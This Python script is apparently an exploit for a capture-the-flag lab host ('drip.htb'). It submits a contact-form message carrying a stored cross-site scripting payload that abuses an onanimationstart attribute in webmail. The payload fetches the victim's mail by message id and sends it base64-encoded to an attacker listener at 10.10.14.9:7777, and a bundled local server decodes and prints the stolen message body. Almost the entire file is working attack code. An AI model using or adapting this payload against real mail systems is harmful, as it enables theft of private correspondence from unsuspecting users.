import requests
from http.server import BaseHTTPRequestHandler, HTTPServer
import base64
import threading
from lxml import html

TARGET_URL = 'http://drip.htb/contact'
LISTEN_PORT = 7777  # TODO Check
LISTEN_IP = '0.0.0.0'

# payload - Fixed string literal issues
start_mesg = '<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=fetch(\'/?_task=mail&_action=show&_uid='
message = 3
end_mesg = '&_mbox=INBOX&_extwin=1\').then(r=>r.text()).then(t=>fetch(`http://10.10.14.9:7777/c=${btoa(t)}`)) foo=bar">Foo</body>'

# Fixed variable name (was post-data with hyphen)
post_data = {
    'name': 'lily',
    'email': 'lily',
    'message': f"{start_mesg}{message}{end_mesg}",
    'content': 'html',
    'recipient': 'bcase@drip.htb'
}

print(f"{start_mesg}{message}{end_mesg}")

# headers for the post Req - Fixed line breaks in strings
headers = {
    'Host': 'drip.htb',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://drip.htb',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Referer': 'http://drip.htb/index',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cookie': 'session=eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiYWFkYzVlMDY2ZDk0YTkxYTExY2EzM2ZjYWE0ODNhMzBlOTczNDE4MCJ9.aLo2fA.sM1Mk0vUaZaBLg48v23qosv-HO8',
    'Connection': 'close'
}

# func to send the post req - Fixed typo (reponse -> response)
def send_post():
    response = requests.post(TARGET_URL, data=post_data, headers=headers)
    print(f"[+] POST Request Sent! Status Code: {response.status_code}")

# Custom HTTP request handler to capture and decode the incoming data
class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):  # Fixed method name (was dot_GET)
        if '/c=' in self.path:
            encoded_data = self.path.split('/c=')[1]
            try:
                decoded_data = base64.b64decode(encoded_data).decode('latin-1')
                tree = html.fromstring(decoded_data)
                # xpath query to find the div with the id 'messagebody'
                message_body = tree.xpath('//div[@id="messagebody"]')  # Fixed typo in xpath
                # if exists then extract
                if message_body:
                    # extract inner text, but keep the line breaks
                    message_text = message_body[0].text_content().strip()
                    print("[+] Extracted message body content:\n")
                    print(message_text)
                else:
                    print("[!] No div with id 'messagebody' found")
            except Exception as e:
                print(f"[!] Error decoding data: {e}")
        else:
            print("[!] Received request with no data")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

    def log_message(self, format, *args):
        return  # Suppress default logging

# Function to start the server
def start_server():
    server = HTTPServer((LISTEN_IP, LISTEN_PORT), RequestHandler)
    print(f"[+] Starting server on {LISTEN_IP}:{LISTEN_PORT}")
    server.serve_forever()

# Run the HTTP server in a separate thread
server_thread = threading.Thread(target=start_server)
server_thread.daemon = True
server_thread.start()

# Give the server a moment to start
import time
time.sleep(1)

# Send the POST request
send_post()

# Keep the main thread alive to continue listening
try:
    print("[+] Server running. Press Ctrl+C to stop.")
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[+] Stopping server.")
